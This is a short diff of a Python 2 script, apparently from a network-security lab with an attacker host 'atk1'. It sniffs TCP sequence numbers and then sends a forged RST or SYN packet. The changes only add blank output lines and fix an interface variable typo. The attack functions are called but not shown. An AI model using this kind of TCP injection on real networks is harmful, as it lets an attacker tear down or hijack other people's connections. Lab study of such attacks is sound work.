@@ -203,12 +203,13 @@ def main():
 	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
 	#src_mac_address = retrieve_atk1_mac_address('atk1-eth1')
 	assert src_mac_address is not None
-	print 'atk1 source MAC address', src_mac_address
+	print '\natk1 source MAC address', src_mac_address
 
 	dst_mac_address = retrieve_r2_mac_address('atk1-eth0', '9.0.0.2')
 	#dst_mac_address = retrieve_r2_mac_address('atk1-eth1', DESTINATION_ADDRESS)
 	assert dst_mac_address is not None
 	print 'R2 destination MAC address', dst_mac_address
+	print
 
 	srcPort, dstPort, seqNum, ackNum, win = retrieve_ports_and_numbers('atk1-eth1', SOURCE_ADDRESS, DESTINATION_ADDRESS)
 	assert srcPort is not None
@@ -221,11 +222,12 @@ def main():
 	print 'sequence number', seqNum
 	print 'acknowledge number', ackNum
 	print 'window', win
+	print
 
 	iface = 'atk1-eth0'
 
 	if choise == 1:
-		send_rst_packet(ifac, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+		send_rst_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
 	elif choise == 2:
 		send_syn_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
 	else:
